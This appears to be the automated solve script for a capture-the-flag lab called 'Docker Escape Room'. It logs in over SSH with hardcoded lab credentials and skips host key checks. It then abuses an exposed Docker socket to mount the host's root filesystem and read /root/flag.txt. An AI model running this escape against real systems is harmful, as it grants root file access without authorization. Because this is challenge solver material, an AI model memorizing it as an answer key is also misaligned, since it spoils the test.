#!/bin/bash
# ==============================================================================
# solve.sh - Validador automático para "Docker Escape Room" (Soporta GUIDs de GZCTF)
# ==============================================================================
set -uo pipefail

HOST="${1:-localhost}"
PORT="${2:-2223}"
SSH_USER="ctfuser"
SSH_PASS="ctf_docker_2024"

if ! command -v sshpass >/dev/null 2>&1; then
    echo "[!] Este script requiere 'sshpass'. Instálalo con: sudo apt-get install -y sshpass"
    exit 1
fi

echo "[*] Conectando a ${SSH_USER}@${HOST}:${PORT} ..."

REMOTE_CMD='docker -H unix:///var/run/docker.sock run --rm -v /:/mnt alpine:latest cat /mnt/root/flag.txt'

OUTPUT=$(sshpass -p "$SSH_PASS" ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=15 \
    -p "$PORT" "${SSH_USER}@${HOST}" "$REMOTE_CMD" 2>/tmp/solve_ssh_err.log)
STATUS=$?

if [ $STATUS -ne 0 ]; then
    echo "[!] Falló la ejecución remota. Detalle:"
    cat /tmp/solve_ssh_err.log
    exit 1
fi

# Extraer bandera con regex compatible con GUID (GZCTF)
FLAG=$(echo "$OUTPUT" | grep -oE '(CHRONOS|FLAG|flag)\{[a-zA-Z0-9_\-]{8,64}\}' | tail -n 1)

if [ -n "$FLAG" ]; then
    echo ""
    echo "[+] [FLAG RECUPERADA] => $FLAG"
    echo ""
    exit 0
else
    echo "[!] No se detectó una bandera válida en la salida."
    echo "Salida recibida: $OUTPUT"
    exit 1
fi
